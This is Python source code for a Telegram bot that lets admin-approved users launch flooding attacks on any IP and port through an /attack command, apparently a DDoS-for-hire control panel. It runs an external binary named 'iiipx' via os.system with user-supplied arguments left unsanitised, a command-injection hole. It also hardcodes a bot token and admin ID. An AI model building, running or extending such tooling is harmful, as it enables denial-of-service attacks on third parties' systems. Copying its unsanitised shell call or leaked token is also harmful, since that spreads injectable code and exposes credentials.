import os
import threading
import asyncio
import time
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

TOKEN = "6838193855:AAFm2sCuJlN8U4ysZpatPL6pud91nMbT5hk"
ADMIN_ID = "6512242172"
authorized_users = set()
active_attacks = []
user_cooldowns = {}

MAX_CONCURRENT_ATTACKS = 3
ATTACK_COOLDOWN = 60  # seconds
MAX_ATTACK_DURATION = 180  # seconds

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🚀 Bot is running! Use /attack <ip> <port> <duration>")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🛠 *Bot Commands:*\n"
        "✅ /start - Start the bot\n"
        "✅ /help - Show commands\n"
        "✅ /attack <ip> <port> <duration> - Launch attack\n"
        "✅ /adduser <user_id> - Add user (Admin only)\n"
        "✅ /removeuser <user_id> - Remove user (Admin only)\n"
        "✅ /status - Check active attack count",
        parse_mode="Markdown"
    )

async def adduser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        await update.message.reply_text("⛔ Only the admin can add users!")
        return

    if len(context.args) != 1:
        await update.message.reply_text("⚠️ Usage: /adduser <user_id>")
        return

    user_id = context.args[0]
    authorized_users.add(user_id)
    await update.message.reply_text(f"✅ User `{user_id}` added!", parse_mode="Markdown")

async def removeuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        await update.message.reply_text("⛔ Only the admin can remove users!")
        return

    if len(context.args) != 1:
        await update.message.reply_text("⚠️ Usage: /removeuser <user_id>")
        return

    user_id = context.args[0]
    authorized_users.discard(user_id)
    await update.message.reply_text(f"❌ User `{user_id}` removed!", parse_mode="Markdown")

def execute_attack(ip, port, duration, chat_id, context):
    active_attacks.append(chat_id)
    os.system(f"./iiipx {ip} {port} {duration}")
    asyncio.run(send_attack_finished_message(chat_id, ip, port, context))
    active_attacks.remove(chat_id)

async def send_attack_finished_message(chat_id, ip, port, context):
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"✅ *Attack Finished!* 🎯 Target `{ip}:{port}`",
        parse_mode="Markdown"
    )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    now = time.time()

    if user_id not in authorized_users:
        await update.message.reply_text("⛔ You are not authorized to use this command!")
        return

    if len(context.args) != 3:
        await update.message.reply_text("⚠️ Usage: /attack <ip> <port> <duration>")
        return

    ip, port, duration = context.args

    if not duration.isdigit() or int(duration) > MAX_ATTACK_DURATION:
        await update.message.reply_text("⚕️ Max attack time is 300 seconds.")
        return

    if len(active_attacks) >= MAX_CONCURRENT_ATTACKS:
        await update.message.reply_text("⚠️ Max attacks already running! Please wait.")
        return

    if user_id in user_cooldowns and now - user_cooldowns[user_id] < ATTACK_COOLDOWN:
        remaining = int(ATTACK_COOLDOWN - (now - user_cooldowns[user_id]))
        await update.message.reply_text(f"⏳ You must wait {remaining}s before launching another attack.")
        return

    user_cooldowns[user_id] = now
    threading.Thread(target=execute_attack, args=(ip, port, duration, update.effective_chat.id, context)).start()

    await update.message.reply_text(
        f"🔥 *Attack Started!* 🚀\n🎯 Target: `{ip}:{port}`\n⏳ Duration: {duration} seconds",
        parse_mode="Markdown"
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count = len(active_attacks)
    await update.message.reply_text(
        f"📊 Currently running attacks: *{count}* / {MAX_CONCURRENT_ATTACKS}",
        parse_mode="Markdown"
    )

def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("adduser", adduser))
    app.add_handler(CommandHandler("removeuser", removeuser))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("status", status))

    print("🤖 Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()